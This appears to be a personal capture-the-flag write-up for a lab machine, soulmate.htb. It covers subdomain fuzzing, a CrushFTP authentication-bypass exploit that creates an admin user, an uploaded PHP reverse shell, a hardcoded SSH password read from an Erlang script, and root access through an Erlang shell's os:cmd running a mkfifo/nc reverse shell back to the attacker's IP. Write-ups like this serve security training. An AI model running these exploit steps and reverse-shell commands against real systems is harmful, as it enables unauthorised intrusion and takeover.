#### Info Enum
`└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 'http://soulmate.htb' -H "HOST:FUZZ.soulmate.htb" -t 100 -fs 154`
```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 204ms]
:: Progress: [19966/19966] :: Job [1/1] :: 482 req/sec :: Duration: [0:00:36] :: Errors: 0 ::
```
set ftp.soulmate.htb to hosts file, the web page running is Crushftp, search vuln for this.

https://github.com/Immersive-Labs-Sec/CVE-2025-31161/blob/main/cve-2025-31161.py

It has a vunl to bypass auth method, and add new user.
`└─$ python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user cushadmin --new_user ed --password qwe123` 
```
[+] Preparing Payloads
  [-] Warming up the target
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: ed
   [*] Password: qwe123.
```

#### foothold
we can change passwd for all users.
User management , reset passwd of ben, since ben have a folder named webprod, the files under this dir are similar as the index page of port 80 page.

http://ftp.soulmate.htb/#%2FwebProd%2F, upload a php revershell. trigger it by accessing 'http://soulmate.htb//php-reverse-shell.php'

`└─$ nc -nvlp 8821 `           
```
listening on [any] 8821 ...
connect to [10.10.16.17] from (UNKNOWN) [10.129.231.23] 41744
Linux soulmate 5.15.0-153-generic #163-Ubuntu SMP Thu Aug 7 16:37:18 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 07:16:02 up  4:50,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)

python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@soulmate:/$ cat /etc/passwd | grep bash
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
ben:x:1000:1000:,,,:/home/ben:/bin/bash
```
run linpeas, found some interesting things, root user is running a clean script to clean added files on web server dir, remember to backup the revershell uploaded.
root        1150  0.0  0.0   7140   220 ?        S    02:26   0:00 /usr/bin/epmd -daemon -address 127.0.0.1
root        1156  0.0  0.0   6896  2796 ?        Ss   02:26   0:00 /usr/sbin/cron -f -P
root        1158  0.0  0.1  10344  4056 ?        S    02:26   0:00  _ /usr/sbin/CRON -f -P
root        1180  0.0  0.0   2892  1008 ?        Ss   02:26   0:00      _ /bin/sh -c /root/scripts/clean-web.sh
root        1181  0.0  0.0   7372  3596 ?        S    02:26   0:00          _ /bin/bash /root/scripts/clean-web.sh
root        1182  0.0  0.0   3104  1860 ?        S    02:26   0:00              _ inotifywait -m -r -e create --format %w%f /var/www/soulmate.htb/public

#### lateral move
a script ran by root, www-data user has read privi
```
root        1147  0.0  1.7 2252164 68536 ?       Ssl  02:26   0:06 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
```
`$ ls -la /usr/local/lib/erlang_login/start.escript`
```
-rwxr-xr-x 1 root root 1427 Aug 15 07:46 /usr/local/lib/erlang_login/start.escript
```
`$ cat /usr/local/lib/erlang_login/start.escript`
```
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
```
                                                                                                                                        

`└─$ ssh ben@soulmate.htb     `
```
The authenticity of host 'soulmate.htb (10.129.231.23)' can't be established.
ED25519 key fingerprint is: SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:85: [hashed name]
    ~/.ssh/known_hosts:88: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'soulmate.htb' (ED25519) to the list of known hosts.
ben@soulmate.htb's password: 
Last login: Tue Feb 10 08:21:11 2026 from 10.10.16.17
ben@soulmate:~$ cd ~
ben@soulmate:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben)
```
the known_hosts file I can try to crack it, since we can see another IP we can access 172.19.0.2. but 
```
-rw-r--r-- 1 ben ben 786 Feb 10 08:24 /home/ben/.ssh/known_hosts
|1|Sunsy4sUZGaPMAoXryLuUOZWJ44=|nJBPjbWoMxNtmy5Xc8wswjWo87o= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCWDnL2V9heWi+f+v+DUivcSEyRRJUODZJ60ZhYdcpnDhOj55iNlnzmfS8a4XuLR5PjTKoql7G2+VNXoGLbzfuZEg25XxjF9CPZEdciawOebySj06Js8Rx58tvJ9b3aeDfcMJtvFIa5QMHroDsWoBMj2+QEkKtR7DjN6HNs1Oyys2RjJGvrB9KabUprvPjWfJNigQtnHfGS+7RJX2F3woxeYMtpkA8Wf1TnfOYsMoLC1YtQT2ukEW+SqRBQBAhSP9fTtfOI3ktjeF8z2dIAwZpa0ZKDgI7c1s3UhaUsy3K59M/aZ+CRqrRgAjQPGKKMcQPaxmo9rcy0BxJZ/NKlw3qvf1e/kmD6TMEcvhIBZql9GqdEhc6B6AEcRPWMnj3R/o8DBpoBZDRW4whWIjSn1aa/osp8w7qZ2lXC1IyTYqzIyPaUiYjwAaW7RADaAWqLCKuECiYgMBn4a1Aug08FvsjuBAPEq8vVchWmmGuFZF1m2mTQNCQIdmBGt2PVjGCNvFI7oX1cVs5d+JqUERiXypbZWdcaGQgxhlcQpY+/7SR5nfCYlxgx94NJBdjtA00YDV32r8D8hhuyW9aW3peQZv3fM4zQ3qeJBAYz9MnvUQ5NpU/yKcB3wq2CAepE8wKJ/0VVu++1+Av2Lfz+d4VELR18QYaPZCDe62J+znD2ZJVOpQ==
```
#### Privi Escalate
netstat to show listening ports, check them
══╣ Active Ports (netstat)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:4369          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:45587         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:35667         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:4369                :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  

For port 2222, a SSH Erlang is running
```
ben@soulmate:~/.ssh$ nc 127.0.0.1 2222
SSH-2.0-Erlang/5.2.9
```

CVE-2025-3243 - Erlang SSH Pre-Auth RCE for this application, or nc 2222

`ben@soulmate:/tmp$ ssh ben@127.0.0.1 -p 2222`
```
The authenticity of host '[127.0.0.1]:2222 ([127.0.0.1]:2222)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:2222' (ED25519) to the list of known hosts.
ben@127.0.0.1's password: 
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)

(ssh_runner@soulmate)1> help().
** shell internal commands **
b()        -- display all variable bindings
e(N)       -- repeat the expression in query <N>
f()        -- forget all variable bindings
f(X)       -- forget the binding of variable X
h()        -- history
h(Mod)     -- help about module
h(Mod,Func)-- help about function in module
h(Mod,Func,Arity) -- help about function with arity in module
ht(Mod)    -- help about a module's types
ht(Mod,Type) -- help about type in module
ht(Mod,Type,Arity) -- help about type with arity in module
hcb(Mod)    -- help about a module's callbacks
hcb(Mod,CB) -- help about callback in module
hcb(Mod,CB,Arity) -- help about callback with arity in module
history(N) -- set how many previous commands to keep
results(N) -- set how many previous command results to keep
catch_exception(B) -- how exceptions are handled
v(N)       -- use the value of query <N>
rd(R,D)    -- define a record
rf()       -- remove all record information
rf(R)      -- remove record information about R
rl()       -- display all record information
rl(R)      -- display record information about R
rp(Term)   -- display Term using the shell's record information
rr(File)   -- read record information from File (wildcards allowed)
rr(F,R)    -- read selected record information from file(s)
rr(F,R,O)  -- read selected record information with options
lf()       -- list locally defined functions
lt()       -- list locally defined types
lr()       -- list locally defined records
ff()       -- forget all locally defined functions
ff({F,A})  -- forget locally defined function named as atom F and arity A
tf()       -- forget all locally defined types
tf(T)      -- forget locally defined type named as atom T
fl()       -- forget all locally defined functions, types and records
save_module(FilePath) -- save all locally defined functions, types and records to a file
bt(Pid)    -- stack backtrace for a process
c(Mod)     -- compile and load module or file <Mod>
cd(Dir)    -- change working directory
flush()    -- flush any messages sent to the shell
help()     -- help info
h(M)       -- module documentation
h(M,F)     -- module function documentation
h(M,F,A)   -- module function arity documentation
i()        -- information about the system
ni()       -- information about the networked system
i(X,Y,Z)   -- information about pid <X,Y,Z>
l(Module)  -- load or reload module
lm()       -- load all modified modules
lc([File]) -- compile a list of Erlang modules
ls()       -- list files in the current directory
ls(Dir)    -- list files in directory <Dir>
m()        -- which modules are loaded
m(Mod)     -- information about module <Mod>
mm()       -- list all modified modules
memory()   -- memory allocation information
memory(T)  -- memory allocation information of type <T>
nc(File)   -- compile and load code in <File> on all nodes
nl(Module) -- load module on all nodes
pid(X,Y,Z) -- convert X,Y,Z to a Pid
pwd()      -- print working directory
q()        -- quit - shorthand for init:stop()
regs()     -- information about registered processes
nregs()    -- information about all registered processes
uptime()   -- print node uptime
xm(M)      -- cross reference check a module
y(File)    -- generate a Yecc parser
** commands in module i (interpreter interface) **
ih()       -- print help for the i module
```

`(ssh_runner@soulmate)8> ls(root).`
```
.bash_history        .bashrc              .cache               
.config              .erlang.cookie       .local               
.profile             .selected_editor     .sqlite_history      
.ssh                 .wget-hsts           root.txt  
```
shows it runs as root.

`(ssh_runner@soulmate)9> m().`
```
Module                File
application           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application.beam
application_controll  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application_controller.beam
application_master    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application_master.beam
...skip...
logger_sup            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_sup.beam
maps                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/maps.beam
net_kernel            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/net_kernel.beam
orddict               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/orddict.beam
ordsets               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/ordsets.beam
os                    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/os.beam
otp_internal          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/otp_internal.beam
...skip...
user_sup              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/user_sup.beam
v3_core               /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/v3_core.beam
zlib                  preloaded
```
os module is used by this system tool, we are able to use os to execute command as privi of root
```
os                    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/os.beam
.beam files are compiled Erlang modules (BEAM = Bogdan/Björn’s Erlang Abstract Machine). They’re the bytecode that the Erlang VM executes.

The os module in Erlang provides functions for interacting with the operating system. For example:

    os:type() → returns the OS type and version.

    os:cmd("ls") → runs a shell command and returns its output.

    os:getenv("PATH") → fetches environment variables.

The path you gave shows it’s part of the kernel application (kernel-10.2.5), which is a core OTP library. The ebin directory is where compiled modules live.

(ssh_runner@soulmate)13> os:cmd("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.17 8822 >/tmp/f").
```

`└─$ nc -nvlp 8822`
```
listening on [any] 8822 ...
connect to [10.10.16.17] from (UNKNOWN) [10.129.231.23] 57156
bash: cannot set terminal process group (68958): Inappropriate ioctl for device
bash: no job control in this shell
root@soulmate:/# cd /root
cd /root
root@soulmate:~# ls
ls
root.txt
```

#### lesson learned
- try diff CVE-xxx for a version of application
- for banary files use OS module, which can be used to run system command 
